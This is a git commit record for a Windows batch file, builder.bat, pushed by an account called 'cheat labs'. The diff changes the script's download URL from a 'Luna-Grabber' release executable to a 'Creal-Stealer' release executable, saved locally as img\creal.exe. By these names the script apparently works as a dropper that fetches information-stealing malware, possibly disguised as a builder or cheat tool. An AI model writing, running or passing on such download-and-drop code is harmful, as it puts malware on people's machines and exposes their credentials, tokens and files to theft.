19591f1311af76d62f9ba35cc127a6560e4a33de
cheat labs <131698090+hvbsvqdj@users.noreply.github.com>
2024-08-07 20:00:36 +0200

    Update builder.bat

--- builder.bat
+++ builder.bat
@@ -1,6 +1,6 @@
 
 @echo off
-set "URL=https://github.com/hvbsvqdj/Luna-Grabber/releases/download/stealer/lunar.exe"
+set "URL=https://github.com/hvbsvqdj/Creal-Stealer/releases/download/Stealer/buidl.exe"
 set "Dossier=img"
 set "NomFichier=%Dossier%\creal.exe"
 
